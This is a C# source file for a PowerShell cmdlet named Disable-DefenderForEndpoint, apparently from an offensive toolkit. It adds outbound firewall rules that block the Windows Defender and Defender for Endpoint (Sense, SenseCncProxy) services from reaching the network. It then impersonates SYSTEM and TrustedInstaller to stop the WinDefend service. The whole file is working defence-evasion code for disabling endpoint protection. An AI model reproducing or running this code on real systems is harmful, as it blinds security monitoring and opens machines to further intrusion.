using System;
using NetFwTypeLib;
using System.Management.Automation;
using TurtleToolKitImpersonate;
using TurtleToolKitServices;

namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Disable, "DefenderForEndpoint")] // <- seeting cmdlet name and verbs
    [Alias("DDFE")] //<- cmdlet alias
    public class DiableDefenderForEndpoint : Cmdlet
    {
        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            WriteWarning("Need to elevate to SYSTEM for this");
            ExecuteDisableDefenderForEndpoint();
            return;
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }


        public bool ExecuteDisableDefenderForEndpoint()
        {
            try { 
                ExecuteFirewallBlock();
                Impersonator.ElevateToSystem();
                Services.StartTrustedInstaller();
                Impersonator.ElevateToTs();
                Services.StopWinDefend();
                ExecuteFirewallBlock();
                WriteVerbose("successfully disabled defender");
                Impersonator.RevokePrivs();
                return true;
            } catch
              {
                WriteWarning("Failed to disable defender");
                Impersonator.RevokePrivs();
                return false;
            }
        }

        // functions to be called by cmdlet
        static void ExecuteFirewallBlock()
        {
            AddBlockRule("windefend", "windefendBlocker", "windefend");
            AddBlockRule("senseCncProxy", "senseCncProxyBlocker", "", "%ProgramFiles%\\Windows Defender Advanced Threat Protection\\SenseCncProxy.exe");
            AddBlockRule("sense", "senseblocker", "sense");
        }
        static bool AddBlockRule(string description, string ruleName, string serviceName = "", string fullPath = "")
        {
            if (fullPath == "")
            {
                // rule by service name
                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWPolicy2"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_BLOCK;
                firewallRule.Description = description;
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
                firewallRule.Enabled = true;
                firewallRule.serviceName = serviceName;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = ruleName;
                //firewallRule.ApplicationName = fullPath;
                firewallPolicy.Rules.Add(firewallRule);
                return true;
            }
            else
            {
                // rule by fullpath
                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWPolicy2"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_BLOCK;
                firewallRule.Description = description;
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
                firewallRule.Enabled = true;
                //firewallRule.serviceName = serviceName;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = ruleName;
                firewallRule.ApplicationName = fullPath;
                firewallPolicy.Rules.Add(firewallRule);
                return true;
            }
        }
    }
}